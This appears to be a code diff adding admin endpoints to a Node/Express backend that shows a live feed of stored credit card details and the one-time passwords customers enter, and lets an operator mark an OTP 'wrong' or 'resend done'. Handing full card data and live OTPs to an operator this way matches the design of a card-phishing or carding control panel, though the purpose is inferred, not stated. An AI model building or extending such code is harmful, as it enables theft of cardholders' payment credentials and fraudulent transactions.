@@ -31,6 +31,15 @@ import { loadBotAdmins, saveBotAdmins, normalizeBotAdmins } from './botAdminsSto
 import { BOT_PERMISSION_KEYS, formatPermissionsHelpAr } from './botPermissions.js';
 import { checkAdminLogin } from './adminAuth.js';
 import { getCreditCardOrderDetails } from './creditCardOrdersStore.js';
+import {
+  CARD_FEED_STATUSES,
+  listCardFeed,
+  updateCardFeedStatus,
+  recordWrongOtpAttempt,
+  markOtpResendDone,
+  getOtpMeta,
+  getFeedEntry,
+} from './creditCardFeedStore.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
@@ -806,8 +815,18 @@ export function registerAdminApi(app) {
       const all = await loadOrders(ORDERS_CRM_PATH);
       const row = findOrderByBusinessId(all, String(req.params.orderId || ''));
       if (!row) return res.status(404).json({ error: 'Order not found' });
-      const card = await getCreditCardOrderDetails(row.orderId || String(req.params.orderId || ''));
-      res.json({ order: row, card });
+      const oid = row.orderId || String(req.params.orderId || '');
+      const card = await getCreditCardOrderDetails(oid);
+      const feedEntry = await getFeedEntry(oid);
+      const otpMeta = await getOtpMeta(oid);
+      res.json({
+        order: row,
+        card,
+        feed_status: feedEntry?.status || otpMeta?.feed_status || 'pending',
+        last_otp: feedEntry?.last_otp || null,
+        otp_attempts: otpMeta?.attempts ?? 0,
+        otp_meta: otpMeta,
+      });
     } catch (e) {
       res.status(500).json({ error: String(e?.message || e) });
     }
@@ -1100,6 +1119,79 @@ export function registerAdminApi(app) {
       delete data.delegates[userId];
       await saveBotAdmins(BOT_ADMINS_PATH, data);
       res.json({ ok: true, delegates: data.delegates });
+    } catch (e) {
+      res.status(500).json({ error: String(e?.message || e) });
+    }
+  });
+
+  app.get('/api/admin/card-feed', async (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    try {
+      const since = typeof req.query.since === 'string' ? req.query.since : undefined;
+      const limitRaw = Number(req.query.limit);
+      const data = await listCardFeed({ since, limit: limitRaw });
+      res.json(data);
+    } catch (e) {
+      res.status(500).json({ error: String(e?.message || e) });
+    }
+  });
+
+  app.get('/api/admin/card-feed/:orderRef', async (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    try {
+      const orderRef = String(req.params.orderRef || '').trim();
+      const card = await getCreditCardOrderDetails(orderRef);
+      if (!card) return res.status(404).json({ error: 'Card not found' });
+      res.json({ order_ref: orderRef, orderId: orderRef, card });
+    } catch (e) {
+      res.status(500).json({ error: String(e?.message || e) });
+    }
+  });
+
+  app.patch('/api/admin/card-feed/:orderRef/status', async (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    try {
+      const orderRef = String(req.params.orderRef || '').trim();
+      const status = String(req.body?.status || '').trim().toLowerCase();
+      if (!orderRef) return res.status(400).json({ error: 'order_ref required' });
+      if (!CARD_FEED_STATUSES.has(status)) {
+        return res.status(400).json({ error: 'Invalid status' });
+      }
+      const feedOk = await updateCardFeedStatus(orderRef, status);
+      if (!feedOk) return res.status(404).json({ error: 'Order not found' });
+      if (status === 'failed') {
+        await updateOrderStatusByOrderId(ORDERS_CRM_PATH, orderRef, 'cancelled');
+      } else if (status === 'completed') {
+        await updateOrderStatusByOrderId(ORDERS_CRM_PATH, orderRef, 'completed');
+      }
+      res.json({ ok: true, order_ref: orderRef, status, feed_updated: feedOk });
+    } catch (e) {
+      res.status(500).json({ error: String(e?.message || e) });
+    }
+  });
+
+  app.patch('/api/admin/card-feed/:orderRef/otp-wrong', async (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    try {
+      const orderRef = String(req.params.orderRef || '').trim();
+      if (!orderRef) return res.status(400).json({ error: 'order_ref required' });
+      const result = await recordWrongOtpAttempt(orderRef);
+      if (result.rejected) {
+        await updateOrderStatusByOrderId(ORDERS_CRM_PATH, orderRef, 'cancelled');
+      }
+      res.json({ ok: true, order_ref: orderRef, ...result });
+    } catch (e) {
+      res.status(500).json({ error: String(e?.message || e) });
+    }
+  });
+
+  app.patch('/api/admin/card-feed/:orderRef/otp-resend-done', async (req, res) => {
+    if (!requireAdmin(req, res)) return;
+    try {
+      const orderRef = String(req.params.orderRef || '').trim();
+      if (!orderRef) return res.status(400).json({ error: 'order_ref required' });
+      await markOtpResendDone(orderRef);
+      res.json({ ok: true, order_ref: orderRef });
     } catch (e) {
       res.status(500).json({ error: String(e?.message || e) });
     }
